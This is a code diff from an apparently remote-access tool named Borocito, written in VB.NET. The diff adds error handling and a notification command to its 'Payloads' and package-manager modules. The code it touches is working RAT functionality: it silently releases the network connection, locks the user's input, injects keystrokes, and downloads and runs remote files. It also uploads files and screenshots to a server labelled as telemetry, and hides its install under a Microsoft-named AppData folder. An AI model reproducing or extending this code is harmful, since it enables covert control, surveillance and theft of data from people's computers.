@@ -5,29 +5,39 @@ Imports System.IO.Compression
 Module Payloads
     Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean
     Sub Inputs(ByVal Status As Boolean)
-        On Error Resume Next
-        BlockInput(Status)
-        AddToLog("Payloads", "Input locker (Mouse & Keyboard) (" & Status & ")", False)
+        Try
+            BlockInput(Status)
+            AddToLog("Payloads", "Input locker (Mouse & Keyboard) (" & Status & ")", False)
+        Catch ex As Exception
+            AddToLog("Inputs@Payloads", "Error: " & ex.Message, True)
+        End Try
     End Sub
     Sub DesconectarConexion()
-        On Error Resume Next
-        Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
-        Dim ArgumentContent As String = "ipconfig /release"
-        p.Arguments = ArgumentContent
-        p.CreateNoWindow = True
-        p.ErrorDialog = False
-        p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
-        System.Diagnostics.Process.Start(p)
-        AddToLog("Payloads", "Internet down!", False)
+        Try
+            Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
+            Dim ArgumentContent As String = "ipconfig /release"
+            p.Arguments = ArgumentContent
+            p.CreateNoWindow = True
+            p.ErrorDialog = False
+            p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
+            System.Diagnostics.Process.Start(p)
+            AddToLog("Payloads", "Internet down!", False)
+        Catch ex As Exception
+            AddToLog("DesconectarConexion@Payloads", "Error: " & ex.Message, True)
+        End Try
     End Sub
     Sub SendTheKeys(ByVal proccess As String, ByVal content As String)
-        Dim ProcID As Integer
-        ProcID = Shell(proccess, AppWinStyle.NormalFocus)
-        AppActivate(ProcID)
-        For Each singleChar As Char In content
-            My.Computer.Keyboard.SendKeys(singleChar, True)
-        Next
-        AddToLog("Payloads", "A text content was processed and showed", False)
+        Try
+            Dim ProcID As Integer
+            ProcID = Shell(proccess, AppWinStyle.NormalFocus)
+            AppActivate(ProcID)
+            For Each singleChar As Char In content
+                My.Computer.Keyboard.SendKeys(singleChar, True)
+            Next
+            AddToLog("Payloads", "A text content was processed and showed", False)
+        Catch ex As Exception
+            AddToLog("SendTheKeys@Payloads", "Error: " & ex.Message, True)
+        End Try
     End Sub
     Sub DownloadComponent(ByVal URL As String, fileName As String, ByVal RunIt As Boolean, ByVal Args As String, Optional ByVal filePath As String = Nothing) 'WORKS! Last Check 03/05/2021 11:33PM
         'Uso CMD: /Payloads.DownloadComponent=URL,fileName,True,NULL,null
@@ -55,7 +65,8 @@ Module Payloads
             If RunIt = True Then
                 Process.Start(filePath & "\" & fileName, Args)
             End If
-        Catch
+        Catch ex As Exception
+            AddToLog("DownloadComponent@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub uploadAfile(ByVal filePath As String, Optional ByVal serverUpload As String = Nothing)
@@ -67,7 +78,7 @@ Module Payloads
                 SendCustomTelemetryFile(filePath, serverUpload)
             End If
         Catch ex As Exception
-            AddToLog("uploadAfile@Payloads", "Error" & ex.Message, True)
+            AddToLog("uploadAfile@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub TakeAnScreenshot()
@@ -94,7 +105,32 @@ Module Payloads
             Threading.Thread.Sleep(100)
             Network.SendCustomTelemetryFile(DIRCommons & "\" & theFileName)
         Catch ex As Exception
-            AddToLog("TakeAnScreenshot@Payloads", "Error" & ex.Message, True)
+            AddToLog("TakeAnScreenshot@Payloads", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub PostNotify(ByVal TipTimeOut As SByte, ByVal TipTitle As String, ByVal TipText As String, ByVal TipIcon As SByte, ByVal iconPath As String)
+        Try
+            '/Payloads.PostNotify=2,Hola,Como estas?, 1, C:\Windows\notepad.exe
+            Dim newNotify As New NotifyIcon
+            newNotify.Visible = True
+            If iconPath <> Nothing Then
+                newNotify.Icon = Icon.ExtractAssociatedIcon(iconPath)
+            End If
+            Dim tipIcono As ToolTipIcon
+            Select Case TipIcon
+                Case 0
+                    tipIcono = ToolTipIcon.None
+                Case 1
+                    tipIcono = ToolTipIcon.Info
+                Case 2
+                    tipIcono = ToolTipIcon.Warning
+                Case 3
+                    tipIcono = ToolTipIcon.Error
+            End Select
+            newNotify.ShowBalloonTip(TipTimeOut, TipTitle, TipText, tipIcono)
+            newNotify.Visible = False
+        Catch ex As Exception
+            AddToLog("PostNotify@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
 
@@ -104,7 +140,7 @@ Module Payloads
             Process.Start(DIRCommons & "\BorocitoUpdater.exe")
             End
         Catch ex As Exception
-            AddToLog("Restart@Payloads", "Error" & ex.Message, True)
+            AddToLog("Restart@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub Uninstall()
@@ -143,7 +179,7 @@ Module Payloads
             Process.Start(uninstallFile)
             End
         Catch ex As Exception
-            AddToLog("Uninstall@Payloads", "Error" & ex.Message, True)
+            AddToLog("Uninstall@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub Update(Optional ByVal args As String = Nothing)
@@ -152,7 +188,7 @@ Module Payloads
             Process.Start(DIRCommons & "\BorocitoUpdater.exe", args)
             End
         Catch ex As Exception
-            AddToLog("Update@Payloads", "Error" & ex.Message, True)
+            AddToLog("Update@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub Extractor()
@@ -161,7 +197,7 @@ Module Payloads
             Process.Start(DIRCommons & "\BorocitoExtractor.exe")
             End
         Catch ex As Exception
-            AddToLog("Extractor@Payloads", "Error" & ex.Message, True)
+            AddToLog("Extractor@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
 End Module
@@ -178,7 +214,8 @@ Module BOROGET
             '   UNINSTALL boro-get uninstall
             '   SET boro-get set boro-get|boro-getPath
             Dim boroGETcommand As String = command.Replace("boro-get", Nothing)
-            boroGETcommand = boroGETcommand.Trim()
+            boroGETcommand = boroGETcommand.TrimStart()
+            boroGETcommand = boroGETcommand.TrimEnd()
             If boroGETcommand = "install" Then
                 Return InstallBOROGET()
             ElseIf boroGETcommand = "uninstall" Then
@@ -197,6 +234,11 @@ Module BOROGET
             ElseIf boroGETcommand = "set" Then
                 Dim args() As String = boroGETcommand.Split("|")
                 Return SetBOROGET(args(1), args(2))
+            ElseIf boroGETcommand = "reset" Then
+                If My.Computer.FileSystem.DirectoryExists("C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-get") Then
+                    My.Computer.FileSystem.DeleteDirectory("C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-get", FileIO.DeleteDirectoryOption.DeleteAllContents)
+                End If
+                Return "Local repository has been cleared!"
             Else
                 'paquete a instalar
                 Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
@@ -204,8 +246,8 @@ Module BOROGET
                 Return "Processing Package (" & boroGETcommand & ")"
             End If
         Catch ex As Exception
-            AddToLog("BORO_GET_ADMIN@BOROGET", "Error" & ex.Message, True)
-            Return "Error parsing 'boro-get' command."
+            AddToLog("BORO_GET_ADMIN@BOROGET", "Error: " & ex.Message, True)
+            Return "Error processing 'boro-get' command."
         End Try
     End Function
     Function InstallBOROGET() As String
@@ -235,7 +277,7 @@ Module BOROGET
             regKey.SetValue("RepoListURL", GetIniValue("CONFIG", "RepoList", DIRBoroGetInstallFolder & "\boro-get.txt"))
             Return "boro-get has been installed!"
         Catch ex As Exception
-            AddToLog("Install@BOROGET", "Error" & ex.Message, True)
+            AddToLog("Install@BOROGET", "Error: " & ex.Message, True)
             Return "Error installing boro-get."
         End Try
     End Function
@@ -254,7 +296,7 @@ Module BOROGET
             regKey.SetValue("RepoListURL", "")
             Return "boro-get has been uninstalled!"
         Catch ex As Exception
-            AddToLog("Uninstall@BOROGET", "Error" & ex.Message, True)
+            AddToLog("Uninstall@BOROGET", "Error: " & ex.Message, True)
             Return "Error uninstalling boro-get."
         End Try
     End Function
@@ -269,7 +311,7 @@ Module BOROGET
             RegeditBoroGet.SetValue(regKey, regValue)
             Return "Key: " & regKey & " Value: " & regValue & " has been setted!"
         Catch ex As Exception
-            AddToLog("Set@BOROGET", "Error" & ex.Message, True)
+            AddToLog("Set@BOROGET", "Error: " & ex.Message, True)
             Return "Error setting registry."
         End Try
     End Function
